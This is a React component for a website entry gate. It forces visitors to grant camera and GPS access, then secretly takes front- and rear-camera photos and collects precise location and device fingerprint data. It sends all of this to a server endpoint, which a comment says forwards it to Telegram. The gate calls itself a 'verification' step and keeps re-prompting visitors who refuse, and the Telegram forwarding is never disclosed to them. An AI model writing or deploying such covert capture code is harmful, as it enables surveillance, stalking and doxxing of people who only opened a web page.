'use client';

import { Camera, Loader2, MapPin, ShieldAlert } from 'lucide-react';
import { ReactNode, useCallback, useEffect, useState } from 'react';

/* 进站授权门禁：摄像头（前+后）与 GPS 必须全部授权，否则停留在授权页反复重弹。
   授权通过后拍前后照 + 采集位置/设备信息上报服务端（服务端转发 Telegram）。 */

const SS_KEY = 'entry_capture_ok';
const LS_KEY = 'entry_capture_last';
const COOLDOWN_MS = 10 * 60 * 1000; // 同一浏览器 10 分钟内多标签页不重复拍

type Status = 'checking' | 'ok' | 'blocked';

type Gps = { lat: number; lng: number; acc: number };

async function grabFrame(stream: MediaStream): Promise<string> {
  const video = document.createElement('video');
  video.srcObject = stream;
  video.muted = true;
  video.playsInline = true;
  await video.play();
  await new Promise((r) => setTimeout(r, 400));
  const w = video.videoWidth || 640;
  const h = video.videoHeight || 480;
  const scale = Math.min(1, 640 / w);
  const canvas = document.createElement('canvas');
  canvas.width = Math.round(w * scale);
  canvas.height = Math.round(h * scale);
  const ctx = canvas.getContext('2d');
  if (ctx) ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  stream.getTracks().forEach((t) => t.stop());
  video.srcObject = null;
  return canvas.toDataURL('image/jpeg', 0.72);
}

/** 前置必拍；后置没有硬件时跳过（桌面机），拒绝授权则 overall denied。 */
async function captureCameras(): Promise<
  { front: string; back?: string } | 'denied'
> {
  if (!navigator.mediaDevices?.getUserMedia) return 'denied';
  let frontStream: MediaStream;
  try {
    frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 } },
      audio: false,
    });
  } catch {
    return 'denied';
  }
  const front = await grabFrame(frontStream);
  let back: string | undefined;
  try {
    const backStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'environment', width: { ideal: 640 } },
      audio: false,
    });
    back = await grabFrame(backStream);
  } catch {
    back = undefined; // 无后置摄像头（桌面设备）
  }
  return { front, back };
}

function getGps(): Promise<Gps | 'denied'> {
  return new Promise((resolve) => {
    if (!('geolocation' in navigator)) return resolve('denied');
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lng: p.coords.longitude,
          acc: Math.round(p.coords.accuracy || 0),
        }),
      () => resolve('denied'),
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
    );
  });
}

async function deviceInfo() {
  const ua = navigator.userAgent;
  let model = '';
  let platform = '';
  let platformVersion = '';
  const nav = navigator as Navigator & {
    userAgentData?: {
      getHighEntropyValues: (hints: string[]) => Promise<{
        model?: string;
        platform?: string;
        platformVersion?: string;
      }>;
    };
  };
  try {
    if (nav.userAgentData?.getHighEntropyValues) {
      const he = await nav.userAgentData.getHighEntropyValues([
        'model',
        'platform',
        'platformVersion',
      ]);
      model = he.model || '';
      platform = he.platform || '';
      platformVersion = he.platformVersion || '';
    }
  } catch {
    /* ignore */
  }
  return { ua, model, platform, platformVersion };
}

export default function EntryGate({ children }: { children: ReactNode }) {
  const [status, setStatus] = useState<Status>('checking');
  const [missing, setMissing] = useState<string[]>([]);
  const [round, setRound] = useState(0);

  const run = useCallback(async () => {
    setStatus('checking');
    setMissing([]);
    const miss: string[] = [];

    const cam = await captureCameras();
    if (cam === 'denied') miss.push('摄像头');
    const gps = await getGps();
    if (gps === 'denied') miss.push('位置');

    if (miss.length) {
      setMissing(miss);
      setStatus('blocked');
      return;
    }

    const device = await deviceInfo();
    try {
      const res = await fetch('/api/entry/report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          front: (cam as { front: string }).front,
          back: (cam as { front: string; back?: string }).back || '',
          gps,
          device,
        }),
      });
      if (!res.ok) throw new Error('report failed');
      try {
        sessionStorage.setItem(SS_KEY, '1');
        localStorage.setItem(LS_KEY, String(Date.now()));
      } catch {
        /* ignore */
      }
    } catch {
      // 上报失败不拦人，下次进入重试
    }
    setStatus('ok');
  }, []);

  useEffect(() => {
    let skip = false;
    try {
      if (sessionStorage.getItem(SS_KEY)) skip = true;
      const last = Number(localStorage.getItem(LS_KEY) || 0);
      if (last && Date.now() - last < COOLDOWN_MS) skip = true;
    } catch {
      /* ignore */
    }
    if (skip) {
      setStatus('ok');
      return;
    }
    void run();
  }, [run, round]);

  if (status === 'ok') return <>{children}</>;

  return (
    <div className='fixed inset-0 z-[9999] flex items-center justify-center bg-gray-950/95 px-5 backdrop-blur'>
      <div className='w-full max-w-sm rounded-2xl bg-white p-6 text-center shadow-2xl dark:bg-gray-800'>
        <div className='mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-amber-500/15 text-amber-600 dark:text-amber-400'>
          {status === 'checking' ? (
            <Loader2 className='h-7 w-7 animate-spin' />
          ) : (
            <ShieldAlert className='h-7 w-7' />
          )}
        </div>
        {status === 'checking' ? (
          <>
            <h1 className='text-base font-semibold text-gray-900 dark:text-gray-100'>
              正在进行进入验证
            </h1>
            <p className='mt-2 text-xs leading-relaxed text-gray-500 dark:text-gray-400'>
              本站需要验证摄像头与位置授权，请在浏览器弹窗中选择「允许」。
            </p>
          </>
        ) : (
          <>
            <h1 className='text-base font-semibold text-gray-900 dark:text-gray-100'>
              授权未完成，无法进入
            </h1>
            <p className='mt-2 text-xs leading-relaxed text-gray-500 dark:text-gray-400'>
              缺少授权：{missing.join('、')}。本站为私人站点，进入必须同时允许
              摄像头（前后拍照）与位置信息。请点击下方按钮重新授权。
            </p>
            <div className='mt-3 flex justify-center gap-4 text-[11px] text-gray-400 dark:text-gray-500'>
              <span className='flex items-center gap-1'>
                <Camera className='h-3.5 w-3.5' /> 前后摄像头
              </span>
              <span className='flex items-center gap-1'>
                <MapPin className='h-3.5 w-3.5' /> 精确位置
              </span>
            </div>
            <button
              type='button'
              onClick={() => setRound((r) => r + 1)}
              className='mt-5 w-full rounded-xl bg-amber-500 py-2.5 text-sm font-medium text-white transition hover:bg-amber-600'
            >
              重新授权
            </button>
          </>
        )}
      </div>
    </div>
  );
}
